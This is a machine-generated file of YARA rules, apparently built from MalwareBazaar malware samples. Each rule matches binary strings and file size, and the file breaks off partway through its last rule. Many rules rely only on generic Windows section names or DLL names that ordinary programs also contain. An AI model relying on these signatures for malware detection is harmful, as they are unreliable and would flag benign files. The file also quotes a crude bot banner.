rule Windows_7f005e91edbeaf3893ec02289059166f89f4fdde301ff91922ce2761fcc49ad7
{
    meta:
        description = "Auto ML: 7f005e91edbeaf3893ec02289059166f89f4fdde301ff91922ce2761fcc49ad7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4410KB
        and all of them
}

rule Android_7f1c986ae33571b0bfaae617d9e4bb02bd2c5e5dab71a24ba6c68d650148fee2
{
    meta:
        description = "Auto ML: 7f1c986ae33571b0bfaae617d9e4bb02bd2c5e5dab71a24ba6c68d650148fee2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "sWBce|^"
        $s3 = "mFJgr_"
        $s4 = "X+Lx>Fo"
        $s5 = "JsonPlugin.tld"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 64133KB
        and all of them
}

rule Windows_7f2a0809944a8ada70af8dca8db7ebd2dcd62fdfa3dea33f36dff97cb5025a04
{
    meta:
        description = "Auto ML: 7f2a0809944a8ada70af8dca8db7ebd2dcd62fdfa3dea33f36dff97cb5025a04"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "8\"pJS'q"
        $s3 = "S'qb$\"p"
        $s4 = "S'qb$#p"
        $s5 = "S'qb$$p"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 510KB
        and all of them
}

rule Linux_7f5ab956e704bd0787b9ad2ea47c60cf43c02c5c2c18b72edb467ed35281679f
{
    meta:
        description = "Auto ML: 7f5ab956e704bd0787b9ad2ea47c60cf43c02c5c2c18b72edb467ed35281679f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AWAVAUATD"
        $s2 = "[]A\\A]A^A_"
        $s3 = "D9l$pD"
        $s4 = "D$p9D$D"
        $s5 = "AWAVAUATI"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 112KB
        and all of them
}

rule Windows_7f921526449963559a911dffeb3fff1cbbfa64dd3189ad36d9b91c495e83446c
{
    meta:
        description = "Auto ML: 7f921526449963559a911dffeb3fff1cbbfa64dd3189ad36d9b91c495e83446c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB
        and all of them
}

rule Windows_7faf4077f98ed7480a73277e9272b40f801928a9796742d6aca71f0f7989fa28
{
    meta:
        description = "Auto ML: 7faf4077f98ed7480a73277e9272b40f801928a9796742d6aca71f0f7989fa28"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_0bc70feb553bde362d94c650261f67ba9c56502ad04c838ff2d7c4fc49a45fb1
{
    meta:
        description = "Auto ML: 0bc70feb553bde362d94c650261f67ba9c56502ad04c838ff2d7c4fc49a45fb1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "$vG;Ds"
        $s3 = "ziHeL42"
        $s4 = "dh,N5s7EPH"
        $s5 = "ZKeXvHS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 714KB
        and all of them
}

rule Windows_7fc4b31a1488f9b2c8211669fa3fa97b723e40cabed7195b9c745357588bc3e9
{
    meta:
        description = "Auto ML: 7fc4b31a1488f9b2c8211669fa3fa97b723e40cabed7195b9c745357588bc3e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "AM )UU"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2514KB
        and all of them
}

rule Windows_7fea77743a93b1bc786b7dc63434b71c87e046b34567bc2cd49919113d9c6b95
{
    meta:
        description = "Auto ML: 7fea77743a93b1bc786b7dc63434b71c87e046b34567bc2cd49919113d9c6b95"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_80151a8f1a291643f0753f68dd304fb0767f387dcf14b3141531e3061fa36347
{
    meta:
        description = "Auto ML: 80151a8f1a291643f0753f68dd304fb0767f387dcf14b3141531e3061fa36347"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1768KB
        and all of them
}

rule Windows_8019a5a5fbb0b100c2d3189fc6fc5a755563f7fc9b635cff45cdb427706e5619
{
    meta:
        description = "Auto ML: 8019a5a5fbb0b100c2d3189fc6fc5a755563f7fc9b635cff45cdb427706e5619"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "B.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5800KB
        and all of them
}

rule Windows_804f07bc39f1916a886c0ff54055641e124f198e66e79239bb7bf126ae1f96ae
{
    meta:
        description = "Auto ML: 804f07bc39f1916a886c0ff54055641e124f198e66e79239bb7bf126ae1f96ae"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "jXhP?B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 179KB
        and all of them
}

rule Windows_80a3a6daec5aabfd25a15094061bcfbd8c9be51b40e19994815aeebc403e9a15
{
    meta:
        description = "Auto ML: 80a3a6daec5aabfd25a15094061bcfbd8c9be51b40e19994815aeebc403e9a15"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "V0Rich"
        $s3 = "`.data"
        $s4 = "could not empty working set for process #%d [%s]"
        $s5 = "could not empty working set for process #%d"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6249KB
        and all of them
}

rule Windows_80cbf7bf0909ce0c9685c4529506d58d49042c0fe73d179dd31adea6330362f0
{
    meta:
        description = "Auto ML: 80cbf7bf0909ce0c9685c4529506d58d49042c0fe73d179dd31adea6330362f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 179KB
        and all of them
}

rule Windows_80da1b7360c8d9aa99ae826402e7232f5b2b1112a81bd29765596a60c8502c66
{
    meta:
        description = "Auto ML: 80da1b7360c8d9aa99ae826402e7232f5b2b1112a81bd29765596a60c8502c66"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "`.reloc"
        $s4 = "v2ERX.n"
        $s5 = "n*jPe1;h'w"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 581KB
        and all of them
}

rule Windows_80e12c2425ec7b8aa8913df82bd47c0c1a62f6539df22b6bf1ddab8b1694e3e8
{
    meta:
        description = "Auto ML: 80e12c2425ec7b8aa8913df82bd47c0c1a62f6539df22b6bf1ddab8b1694e3e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1234KB
        and all of them
}

rule Windows_80f1abd5006e75632ccce2516b48be9abf23a9bf80a4dceeee1b73a6b7251b3a
{
    meta:
        description = "Auto ML: 80f1abd5006e75632ccce2516b48be9abf23a9bf80a4dceeee1b73a6b7251b3a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Them_Click_1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 748KB
        and all of them
}

rule Windows_00f82f5933b6f1bae3193eeefb7d5b7b6148028d7985a9b489e141f315ecf7c7
{
    meta:
        description = "Auto ML: 00f82f5933b6f1bae3193eeefb7d5b7b6148028d7985a9b489e141f315ecf7c7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 666KB
        and all of them
}

rule Windows_0bc90706defe0f5defbc5be90ea4d4c14ec01ad3b85ac35baa4db1b9906bcad6
{
    meta:
        description = "Auto ML: 0bc90706defe0f5defbc5be90ea4d4c14ec01ad3b85ac35baa4db1b9906bcad6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3816KB
        and all of them
}

rule Linux_81921ea5f890589516c8bdf261b819446bc5e59403b83c8ec802f638ffd8065c
{
    meta:
        description = "Auto ML: 81921ea5f890589516c8bdf261b819446bc5e59403b83c8ec802f638ffd8065c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s2 = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGH"
        $s3 = "IJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
        $s4 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s5 = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 77KB
        and all of them
}

rule Windows_81cf1c51b336bc81ecd72f78b74d0d7396ed07568dddcd5768c1ad72150be89f
{
    meta:
        description = "Auto ML: 81cf1c51b336bc81ecd72f78b74d0d7396ed07568dddcd5768c1ad72150be89f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "gVBzZT"
        $s5 = "t=8u|FH<"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 220KB
        and all of them
}

rule Windows_81e0f965f92b1b5ab9e12f818e2751bde8b8119f6a83fa84035434f38920c91c
{
    meta:
        description = "Auto ML: 81e0f965f92b1b5ab9e12f818e2751bde8b8119f6a83fa84035434f38920c91c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "C<P\\23J4q"
        $s3 = "WpF8n,"
        $s4 = "]vo.bo}"
        $s5 = "jalQ;]"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1491KB
        and all of them
}

rule Windows_828cda2143a5d51706f89716c96c8714cdadac696df62a806e566ecead0ed4ce
{
    meta:
        description = "Auto ML: 828cda2143a5d51706f89716c96c8714cdadac696df62a806e566ecead0ed4ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "tTSWSj"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1035KB
        and all of them
}

rule Windows_82938e004b66e08eaa68cefb98eb52dae747e96763dce49b67041f25005dfd3f
{
    meta:
        description = "Auto ML: 82938e004b66e08eaa68cefb98eb52dae747e96763dce49b67041f25005dfd3f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 37KB
        and all of them
}

rule Windows_82a4f34acb3cdd88fe0f4effeda5358cdcfe34373d1162771ceb19aa16cc2f0d
{
    meta:
        description = "Auto ML: 82a4f34acb3cdd88fe0f4effeda5358cdcfe34373d1162771ceb19aa16cc2f0d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "*jRichu"
        $s3 = "`.rdata"
        $s4 = ".ndata"
        $s5 = "SQSSSPW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB
        and all of them
}

rule Windows_82bfcca0c937434192318662d7f4888d008eda18c0b37635aea0b5b811cbb17b
{
    meta:
        description = "Auto ML: 82bfcca0c937434192318662d7f4888d008eda18c0b37635aea0b5b811cbb17b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win64"
        $s2 = "`.data"
        $s3 = ".didata"
        $s4 = ".edata"
        $s5 = ".rdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 25077KB
        and all of them
}

rule Windows_8302d62f0ccd3c416440e413b641e698172e5258c81f1271da5fa782c034cc15
{
    meta:
        description = "Auto ML: 8302d62f0ccd3c416440e413b641e698172e5258c81f1271da5fa782c034cc15"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = ".pdata"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 420KB
        and all of them
}

rule Linux_832aaeebe836290917751917d95614dee04051b970be82fd498fc5f403bf3998
{
    meta:
        description = "Auto ML: 832aaeebe836290917751917d95614dee04051b970be82fd498fc5f403bf3998"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 129KB
        and all of them
}

rule Windows_8346fd8577212a80d6899c2c718aeea5eda3b385da5143185aea6e8a41a36d64
{
    meta:
        description = "Auto ML: 8346fd8577212a80d6899c2c718aeea5eda3b385da5143185aea6e8a41a36d64"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3140KB
        and all of them
}

rule Linux_0bc9c084c262a26e686902d19a051678b0c7811477fd01de00b1009892fa4d3c
{
    meta:
        description = "Auto ML: 0bc9c084c262a26e686902d19a051678b0c7811477fd01de00b1009892fa4d3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AYPj)X"
        $s2 = "j\"AZj"
        $s3 = "Zj*X"
        $s4 = "Wj#Xj"
        $s5 = "YY_H"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1KB
        and all of them
}

rule Linux_835099877fff293e7d5f227ee8af9792f018f240f3f4b9a4087dff8a76fd3ac4
{
    meta:
        description = "Auto ML: 835099877fff293e7d5f227ee8af9792f018f240f3f4b9a4087dff8a76fd3ac4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "google"
        $s2 = "objectClass0"
        $s3 = "service:service-agent"
        $s4 = "default"
        $s5 = "\"3DUfw"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB
        and all of them
}

rule Windows_836702e8e9b5cc72d071836f7aece14f2f55103db492110feb3d1df399cb5a7e
{
    meta:
        description = "Auto ML: 836702e8e9b5cc72d071836f7aece14f2f55103db492110feb3d1df399cb5a7e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4011KB
        and all of them
}

rule Windows_83716867ce29635da108fe727d026684d2d853b700edead2e201a38583995e40
{
    meta:
        description = "Auto ML: 83716867ce29635da108fe727d026684d2d853b700edead2e201a38583995e40"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Diagram"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB
        and all of them
}

rule Linux_838cd9004a5e849f238675106bcafc75be9207573f2d79a38d778599d3baac8a
{
    meta:
        description = "Auto ML: 838cd9004a5e849f238675106bcafc75be9207573f2d79a38d778599d3baac8a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "`N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "3fnHx@"
        $s5 = "NuNq o"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 60KB
        and all of them
}

rule Linux_83d1cb2bacc1020ee409d91d466b6070ecbaf76fb940efc6f9d53ac44df6bda9
{
    meta:
        description = "Auto ML: 83d1cb2bacc1020ee409d91d466b6070ecbaf76fb940efc6f9d53ac44df6bda9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB
        and all of them
}

rule Linux_83ebda36fd35669fb0644dc692e6354f2544936d34d382668e6f84ba5c84d1c6
{
    meta:
        description = "Auto ML: 83ebda36fd35669fb0644dc692e6354f2544936d34d382668e6f84ba5c84d1c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "^bqHxcr|"
        $s2 = "[M9=yEJ"
        $s3 = "kXT^@~$i"
        $s4 = "TAHv/#bU"
        $s5 = "5?pZnPq;"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB
        and all of them
}

rule Windows_83f87484754b4f4301e2b9cf06e5400d232e14129f86384ad192e42eb4b0d2af
{
    meta:
        description = "Auto ML: 83f87484754b4f4301e2b9cf06e5400d232e14129f86384ad192e42eb4b0d2af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2678KB
        and all of them
}

rule Linux_84396bb4667f76355bb417156a49002d35a78c4a3c415b878d3ba852ffac6eaf
{
    meta:
        description = "Auto ML: 84396bb4667f76355bb417156a49002d35a78c4a3c415b878d3ba852ffac6eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/ld-uClibc.so.0"
        $s2 = "libc.so.0"
        $s3 = "strcpy"
        $s4 = "vsprintf"
        $s5 = "connect"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB
        and all of them
}

rule Windows_84713aa9c504e1e41b1fb05b4443d88045964ef157b3b7982c8606b848fcfb11
{
    meta:
        description = "Auto ML: 84713aa9c504e1e41b1fb05b4443d88045964ef157b3b7982c8606b848fcfb11"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2307KB
        and all of them
}

rule Windows_84b0e2a4b475fe6eaa507eae7667016a7d3c684d8ba55fcdbcdf00e76fa12fe4
{
    meta:
        description = "Auto ML: 84b0e2a4b475fe6eaa507eae7667016a7d3c684d8ba55fcdbcdf00e76fa12fe4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "SVWu:ff"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1671KB
        and all of them
}

rule Windows_0bfbf2c85ce9fcf06ffcd1fa04bcb0d74da169fb0c6567c532a7ef09f1850d9f
{
    meta:
        description = "Auto ML: 0bfbf2c85ce9fcf06ffcd1fa04bcb0d74da169fb0c6567c532a7ef09f1850d9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19272KB
        and all of them
}

rule Windows_84e6f00d114d875964b9a4d54d53ec6668e325653d3d5b9fb3d6c767040e8143
{
    meta:
        description = "Auto ML: 84e6f00d114d875964b9a4d54d53ec6668e325653d3d5b9fb3d6c767040e8143"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 746KB
        and all of them
}

rule Windows_84f668529edea0be84b952dd2b2daa4b4463416b0c7a721eda7a4f9f1c2f7b43
{
    meta:
        description = "Auto ML: 84f668529edea0be84b952dd2b2daa4b4463416b0c7a721eda7a4f9f1c2f7b43"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "uRFGHt"
        $s5 = "QVWWRP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 710KB
        and all of them
}

rule Windows_8507630f173a2b6429290c725cc704488616c708563234f603f1b0fdf461de10
{
    meta:
        description = "Auto ML: 8507630f173a2b6429290c725cc704488616c708563234f603f1b0fdf461de10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3541KB
        and all of them
}

rule Windows_8518533444f9d26fabdd17053c4e69df268c6f3d3ef8be30fd2ab649641b6343
{
    meta:
        description = "Auto ML: 8518533444f9d26fabdd17053c4e69df268c6f3d3ef8be30fd2ab649641b6343"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "_VVVVV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 202KB
        and all of them
}

rule Windows_851e7b8312083b0068cf53b838e1b11394b60b6d678ed6e4bd4da672becb0ee4
{
    meta:
        description = "Auto ML: 851e7b8312083b0068cf53b838e1b11394b60b6d678ed6e4bd4da672becb0ee4"
